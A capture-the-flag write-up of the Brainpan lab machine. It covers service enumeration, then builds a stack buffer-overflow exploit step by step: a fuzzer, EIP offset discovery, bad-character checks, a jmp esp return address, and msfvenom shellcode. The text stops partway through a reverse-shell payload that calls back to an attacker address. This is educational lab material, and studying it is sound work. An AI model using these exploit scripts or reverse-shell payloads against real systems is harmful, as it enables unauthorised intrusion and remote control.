+++
title = 'Brainpan Boot2Root Write-Up'
date = '2020-12-22'
author = 'Nate Catelli'
summary = 'A boot2root writeup of the Brainpan1 host from TryHackMe.'
tags = ['ctf', 'boot2root', 'hacking', 'writeup', 'tryhackme']
draft = false
+++

## Introduction

Brainpan was an interesting challenge as it had many pivots and took hours over the span of two days to complete. I found that I quickly gained access to the host but was stuck trying to find a way to excalate an unprivileged account to root. Local scans made it seem like there maybe were a few ways to reach root though I ended up achieving the escalation via a kernel exploit that I'd never had the opportunity to attempt yet.

## Environment

The attack took place on a flat network consisting of the attack host, a freshly-booted Kali Linux livecd, and the target. I knew there would most likely be a buffer overflow exploit that would need to be exploited going into this attack, at some point, but little else.

## Attack

Prior to starting the attack, I prepared my workstation by setting up burpsuite, including installing the requisite certificates in firefox. In addition, I also installed `jq`, [gobuster](https://github.com/OJ/gobuster) and the [seclists](https://github.com/danielmiessler/SecLists) wordlist collections.

### Host enumeration

I started the attack by running Connect, Version and OS scans against the host which identified only 2 open ports. One appeared to be an http server. However the other looked to be an unidentified TCP serice that was prompting for input.

```bash
root@kali:~/ctf# nmap -sC -sV -Pn -O 10.10.42.127
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-23 02:35 UTC
root@kali:~/ctf# nmap -sC -sV -Pn -O 10.10.42.127
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-23 02:35 UTC
Nmap scan report for ip-10-10-112-152.eu-west-1.compute.internal (10.10.42.127)
Host is up (0.00043s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings:
|   NULL:
|     _| _|
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_|
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :                                                                                                                                                                SF-Port9999-TCP:V=7.80%I=7%D=12/23%Time=5FE2ACFE%P=x86_64-pc-linux-gnu%r(N                                                                                            SF:ULL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\
SF:|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20
SF:\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\
SF:x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
SF:x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
SF:x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\
SF:|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\
SF:x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\
SF:x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\
SF:x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20
SF:_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\
SF:x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\
SF:x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\
SF:x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
MAC Address: 02:65:A0:1B:B0:DD (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/23%OT=9999%CT=1%CU=36762%PV=Y%DS=1%DC=D%G=Y%M=0265A
OS:0%TM=5FE2AD36%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=Z%I
OS:I=I%TS=8)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST
OS:11NW7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=45EA%W2=45EA%W3=45EA%W4=45EA%W
OS:5=45EA%W6=45EA)ECN(R=Y%DF=Y%T=40%W=4602%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=
OS:Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y
OS:%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%R
OS:D=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)I
OS:E(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https:/
/nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.84 seconds
```

To satisfy my curiosity, I connected to this service with `netcat` and found an interface that prompted for a password. I fed it a test password and was denied access and disconnected.

```bash
root@kali:~/ctf# nc 10.10.42.127 9999
_|                            _|
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|
                                            _|

[________________________ WELCOME TO BRAINPAN _________________________]
                          ENTER THE PASSWORD

                          >> test
                          ACCESS DENIED
root@kali:~/ctf#
```

While I knew there had to be more here, I had a feeling this could potentially be a rabbit hole without more information. I decided to crawl the webserver to see if I could learn anything more about the target before focusing on this any longer.

### Enumerating the webserver

I opened site index to find a single image and little else.

![brainpan http index](/img/brainpan_http_index.png)

Probing around for an `robots.txt` or other common directories yielded nothing so I decided to run `gobuster` against the webserver with the `directories-2.3-medium.txt` wordlist to see if I could identify any less common directory names.

```bash
root@kali:~/ctf# gobuster dir -u 'http://10.10.42.127:10000/' -w /usr/share/seclists/Discovery/Web-Content/
Display all 128 possibilities? (y or n)
root@kali:~/ctf# gobuster dir -u 'http://10.10.42.127:10000/' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.42.127:10000/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/23 02:49:07 Starting gobuster
===============================================================
/bin (Status: 301)
===============================================================
2020/12/23 02:50:12 Finished
===============================================================
```

The scan returned a single directory, `/bin/` which contained a single executable file. Given the name of the file, I assumed this was the executable for the `brainpan` service running on port `9999` and given that it was a 32-bit windows executable, assumed that I would be attacking a windows host.

```bash
root@kali:~/ctf# curl -sD - 'http://10.10.42.127:10000/bin/'
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/2.7.3
Date: Wed, 23 Dec 2020 02:51:02 GMT
Content-type: text/html; charset=UTF-8
Content-Length: 230

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"><html>
<title>Directory listing for /bin/</title>
<body>
<h2>Directory listing for /bin/</h2>
<hr>
<ul>
<li><a href="brainpan.exe">brainpan.exe</a>
</ul>
<hr>
</body>
</html>
```

```bash
root@kali:~/ctf# curl -sO 'http://10.10.42.127:10000/bin/brainpan.exe'
root@kali:~/ctf# file brainpan.exe 
brainpan.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows
```

### Pwning brainpan

Knowing there was a buffer overflow somewhere in this challege, I worked under the assumption that this was enough evidence to start investigating the `brainpan.exe` binary for a vulnerability that I could use to make any futher progress onto the host. To facilitate this, I decided to setup an environment to begin fuzzing the service.

#### Setting up a testing environment

I began by spinning up a Windows 7 VM with a host interface so I could easily interact with it from my attack host. I then installed Immunity Debugger, and [mona](https://github.com/corelan/mona) as I assumed that there would be a buffer overflow in the input field of the service.

![immunity debugger](/img/brainpan_immunity_debugger.png)

Finally, I setup a project directory in mona with `!mona config -set workingfolder c:\mona\%p` and confirmed that I could hit the local brainpan service with netcat via `nc 192.168.0.14 9999`.

#### Fuzzing brainpan

To start crafting the exploit, I opened up a shell in a `python:3` docker image and installed `pwntools`. I then created the following fuzzer script to iterate over sending an increasingly long payload to the input prompt of the brainpan service with the hope of coaxing it to crash.

```python
#!/usr/bin/env python3

import sys, time
from pwn import *

# context vars
context.arch = 'amd64'

# target
ip = '192.168.0.14'
port = '9999'

counter = 100
iterations = 30
buffer = ["A" * counter * i for i in range(1, iterations + 1)]

for buf in buffer:
    try:
        target = remote(ip, port, typ='tcp')
        target.recvuntil(">> ")
        log.info(f"sending payload of {len(buf)} bytes")
        target.sendline(buf)
        target.recvuntil("\n")
        target.close()
    except:
        print(f"Could not connect to {ip}: {port}")
        sys.exit(0)
    time.sleep(1)
```

```bash
root@00e35ba5ecd5:~# python3 fuzzer.py 
[+] Opening connection to 192.168.0.14 on port 9999: Done
[*] sending payload of 100 bytes
[*] Closed connection to 192.168.0.14 port 9999
[+] Opening connection to 192.168.0.14 on port 9999: Done
[*] sending payload of 200 bytes
[*] Closed connection to 192.168.0.14 port 9999
[+] Opening connection to 192.168.0.14 on port 9999: Done
[*] sending payload of 300 bytes
[*] Closed connection to 192.168.0.14 port 9999
[+] Opening connection to 192.168.0.14 on port 9999: Done
[*] sending payload of 400 bytes
[*] Closed connection to 192.168.0.14 port 9999
[+] Opening connection to 192.168.0.14 on port 9999: Done
[*] sending payload of 500 bytes
[*] Closed connection to 192.168.0.14 port 9999
[+] Opening connection to 192.168.0.14 on port 9999: Done
[*] sending payload of 600 bytes
Could not connect to 192.168.0.14: 9999
```

Running this script caused a crash with a 600 byte long payload and appeared to confirm my suspicion that this would be a simple overflow due to the instruction pointer (EIP) being overwritten with the value `41414141` or `AAAA`. After a few repeats, I could safely assume that the EIP sat at an offset between 500 and 600 bytes off from where the input was stored.

![fuzzer overflow](/img/brainpan_fuzzer_overflow.png)

#### Crafting an exploit

Having identified the potential for a stack overflow exploit, I decided to switch to a more flexible template script that I could begin refining as I learned more about the brainpan service. I set the total payload size to 1000 signifying 1000 bytes to exploit the 500-600 byte overflow with some overhead for a payload.

```python
#!/usr/bin/env python3

import sys
from pwn import *

# context vars
context.arch = 'amd64'

# target
target = remote('192.168.0.14', 9999, typ='tcp')

# target-specific vars

# payload vars
total_payload_size = 1000
offset = 0
overflow = "A" * offset
retn = ""
padding = "\x90" * 0
bad_chars = ""
payload =  ""
postfix = "C" * (total_payload_size - offset - len(retn) - len(padding) - len(payload))

buffer = "".join([
    overflow,
    retn,
    padding,
    payload,
    postfix
])

# send exploit
# sending payload
target.recvuntil(">> ")
log.info(f"sending payload of {len(buffer)} bytes")
target.sendline(buffer)
target.recvuntil("\n")

# cleanup
target.close()
sys.exit(0)
```

#### Identifying the EIP offset

Next, I needed to identify the exact offset that began the overflow into the instruction pointer. To better identify this, I then decided to use a cyclical pattern as a payload, which I generated with the metasploit framework's `pattern_create.rb` script. These work by generating a unique sequence of characters allowing the offset to be derived by the values visible at any location in the payload.

```bash
root@kali:~/ctf# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
```

I appended this pattern string to the payload in my exploit script like the following.

```python
payload += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"
```

```bash
root@00e35ba5ecd5:~# python3 exploit.py 
[+] Opening connection to 192.168.0.14 on port 9999: Done
[*] sending payload of 1000 bytes
```

Rerunning the script confirmed again that the EIP was overwritten and using the handy `!mona findmsp -distance 1000` command in immunity debugger I could easily identify the offset via the unique pattern in the instruction pointer.

![mona findmsp](/img/brainpan_mona_findmsp.png)

This showed that the EIP offset was at `524` bytes so I updated the `offset` variable in my exploit to reflect this and, additionally, set the `retn` variable to `BBBB` to confirm that I could overwrite the EIP with a known value, in this case `BBBB` or `42424242`. Rerunning the exploit quickly confirmed this.

![overwrite EIP](/img/brainpan_overwrite_EIP_with_offset.png)

#### Identifying bad characters

Now that I had control of the EIP, I needed to validate that there were no values, or bad characters, that could cause termination or corruption of the input. I generated a 254-byte array ranging from `0x01` - `0xFF` using a short python script. `0x00` was excluded under the assumption that this was already a "bad" null termination character.

```python
#!/usr/bin/env python3

for x in range(1, 256):
    print(f"\\x{x:02x}", end='')
print("")
```

```bash
> python3 bytearraygen.py 
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

I then replaced the payload in my exploit with the bytearray and reran the exploit. Next I leveraged mona's bytearray command to generate an identical bytearray that I could compare against the contents of the stack, again excluding the null byte.

```bash
!mona bytearray -b "\x00"
!mona compare -f C:\mona\brainpan\bytearray.bin -a 0028F930
```

Running a compare against the address at the stack pointer confirmed that there were no other bad characters.

![mona bad_char comparison](/img/brainpan_mona_badchar_comparison.png)

I added the null byte to my `bad_chars` variable for documentation and cleared the bytearray payload.

```python
bad_chars = "\x00"
```

#### Identifying a jump point

Finally to complete the exploit, I needed a jmp instruction without ASLR/PIE that I could use to hijack command execution. I ran the `!mona jmp -r esp -cpb "\x00"` command, passing the null byte as a bad char and it quickly identified a single instruction address that I could use `0x311712f3`. I converted the address to little-endian format to conform to the target's architecture and updated the `retn` variable in my exploit to point to the jump.

```python
retn = "\xf3\x12\x17\x31"
```

#### Generating a test payload

With all the components to exploit the target in place, I now only needed shellcode to confirm I could get remote code execution on the service. I used msfvenom to create a small payload to run calc.exe. Should everything work successfully, this would cause calc.exe to open on my test environments desktop.

```bash
root@kali:~/ctf# msfvenom -p windows/exec CMD=calc.exe -b "x00" -f python -v payload | sed 's/b"/"/'
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 220 (iteration=0)
x86/shikata_ga_nai chosen with final size 220
Payload size: 220 bytes
Final size of python file: 1180 bytes
payload =  ""
payload += "\xda\xdf\xd9\x74\x24\xf4\x5b\xba\xea\x73\x0c\xc9"
payload += "\x31\xc9\xb1\x31\x83\xc3\x04\x31\x53\x14\x03\x53"
payload += "\xfe\x91\xf9\x35\x16\xd7\x02\xc6\xe6\xb8\x8b\x23"
payload += "\xd7\xf8\xe8\x20\x47\xc9\x7b\x64\x6b\xa2\x2e\x9d"
payload += "\xf8\xc6\xe6\x92\x49\x6c\xd1\x9d\x4a\xdd\x21\xbf"
payload += "\xc8\x1c\x76\x1f\xf1\xee\x8b\x5e\x36\x12\x61\x32"
payload += "\xef\x58\xd4\xa3\x84\x15\xe5\x48\xd6\xb8\x6d\xac"
payload += "\xae\xbb\x5c\x63\xa5\xe5\x7e\x85\x6a\x9e\x36\x9d"
payload += "\x6f\x9b\x81\x16\x5b\x57\x10\xff\x92\x98\xbf\x3e"
payload += "\x1b\x6b\xc1\x07\x9b\x94\xb4\x71\xd8\x29\xcf\x45"
payload += "\xa3\xf5\x5a\x5e\x03\x7d\xfc\xba\xb2\x52\x9b\x49"
payload += "\xb8\x1f\xef\x16\xdc\x9e\x3c\x2d\xd8\x2b\xc3\xe2"
payload += "\x69\x6f\xe0\x26\x32\x2b\x89\x7f\x9e\x9a\xb6\x60"
payload += "\x41\x42\x13\xea\x6f\x97\x2e\xb1\xe5\x66\xbc\xcf"
payload += "\x4b\x68\xbe\xcf\xfb\x01\x8f\x44\x94\x56\x10\x8f"
payload += "\xd1\xa9\x5a\x92\x73\x22\x03\x46\xc6\x2f\xb4\xbc"
payload += "\x04\x56\x37\x35\xf4\xad\x27\x3c\xf1\xea\xef\xac"
payload += "\x8b\x63\x9a\xd2\x38\x83\x8f\xb0\xdf\x17\x53\x19"
payload += "\x7a\x90\xf6\x65"
```

I then updated the padding variable to provide 16 bytes of nop instructions for the payload to destroy if it needed to decode any of these instructions.

```python
padding = "x90" * 16
```

With these generated, I had my first full exploit for the brainpan service.

```python
#!/usr/bin/env python3

import sys
from pwn import *

# context vars
context.arch = 'amd64'

# target
target = remote('192.168.0.14', 9999, typ='tcp')

# target-specific vars

# payload vars
total_payload_size = 1000
offset = 524
overflow = "A" * offset
retn = "\xf3\x12\x17\x31"
padding = "\x90" * 16
bad_chars = "\x00"
#root@kali:~/ctf# msfvenom -p windows/exec CMD=calc.exe -b "x00" -f python -v payload | sed 's/b"/"/'
payload =  ""
payload += "\xda\xdf\xd9\x74\x24\xf4\x5b\xba\xea\x73\x0c\xc9"
payload += "\x31\xc9\xb1\x31\x83\xc3\x04\x31\x53\x14\x03\x53"
payload += "\xfe\x91\xf9\x35\x16\xd7\x02\xc6\xe6\xb8\x8b\x23"
payload += "\xd7\xf8\xe8\x20\x47\xc9\x7b\x64\x6b\xa2\x2e\x9d"
payload += "\xf8\xc6\xe6\x92\x49\x6c\xd1\x9d\x4a\xdd\x21\xbf"
payload += "\xc8\x1c\x76\x1f\xf1\xee\x8b\x5e\x36\x12\x61\x32"
payload += "\xef\x58\xd4\xa3\x84\x15\xe5\x48\xd6\xb8\x6d\xac"
payload += "\xae\xbb\x5c\x63\xa5\xe5\x7e\x85\x6a\x9e\x36\x9d"
payload += "\x6f\x9b\x81\x16\x5b\x57\x10\xff\x92\x98\xbf\x3e"
payload += "\x1b\x6b\xc1\x07\x9b\x94\xb4\x71\xd8\x29\xcf\x45"
payload += "\xa3\xf5\x5a\x5e\x03\x7d\xfc\xba\xb2\x52\x9b\x49"
payload += "\xb8\x1f\xef\x16\xdc\x9e\x3c\x2d\xd8\x2b\xc3\xe2"
payload += "\x69\x6f\xe0\x26\x32\x2b\x89\x7f\x9e\x9a\xb6\x60"
payload += "\x41\x42\x13\xea\x6f\x97\x2e\xb1\xe5\x66\xbc\xcf"
payload += "\x4b\x68\xbe\xcf\xfb\x01\x8f\x44\x94\x56\x10\x8f"
payload += "\xd1\xa9\x5a\x92\x73\x22\x03\x46\xc6\x2f\xb4\xbc"
payload += "\x04\x56\x37\x35\xf4\xad\x27\x3c\xf1\xea\xef\xac"
payload += "\x8b\x63\x9a\xd2\x38\x83\x8f\xb0\xdf\x17\x53\x19"
payload += "\x7a\x90\xf6\x65"
postfix = "C" * (total_payload_size - offset - len(retn) - len(padding) - len(payload))

buffer = "".join([
    overflow,
    retn,
    padding,
    payload,
    postfix
])

# send exploit
# sending payload
target.recvuntil(">> ")
log.info(f"sending payload of {len(buffer)} bytes")
target.sendline(buffer)
target.recvuntil("\n")

# cleanup
target.close()
sys.exit(0)
```

I executed the new payload and was pleased to confirm that I had RCE.

![pop calc](/img/brainpan_pop_calc.png)

#### Generating a test shell payload

Now that I had code execution, I needed shellcode that performed a more useful action than opening a calculator on my desktop. I generated a reverse shell to my local test environment similarly to how I had generated the `cmd/exec` shellcode.

```bash
root@kali:~/ctf# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.13 LPORT=4444 -v payload -b '\x00' -f python | sed 's/b"/"/'
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1869 bytes
payload =  ""
payload += "\xba\x51\x1f\x1b\xee\xd9\xc4\xd9\x74\x24\xf4\x5d"
payload += "\x33\xc9\xb1\x52\x31\x55\x12\x03\x55\x12\x83\xbc"
payload += "\xe3\xf9\x1b\xc2\xf4\x7c\xe3\x3a\x05\xe1\x6d\xdf"
payload += "\x34\x21\x09\x94\x67\x91\x59\xf8\x8b\x5a\x0f\xe8"
payload += "\x18\x2e\x98\x1f\xa8\x85\xfe\x2e\x29\xb5\xc3\x31"
payload += "\xa9\xc4\x17\x91\x90\x06\x6a\xd0\xd5\x7b\x87\x80"
payload += "\x8e\xf0\x3a\x34\xba\x4d\x87\xbf\xf0\x40\x8f\x5c"
payload += "\x40\x62\xbe\xf3\xda\x3d\x60\xf2\x0f\x36\x29\xec"
payload += "\x4c\x73\xe3\x87\xa7\x0f\xf2\x41\xf6\xf0\x59\xac"
payload += "\x36\x03\xa3\xe9\xf1\xfc\xd6\x03\x02\x80\xe0\xd0"
payload += "\x78\x5e\x64\xc2\xdb\x15\xde\x2e\xdd\xfa\xb9\xa5"
payload += "\xd1\xb7\xce\xe1\xf5\x46\x02\x9a\x02\xc2\xa5\x4c"
payload += "\x83\x90\x81\x48\xcf\x43\xab\xc9\xb5\x22\xd4\x09"
payload += "\x16\x9a\x70\x42\xbb\xcf\x08\x09\xd4\x3c\x21\xb1"
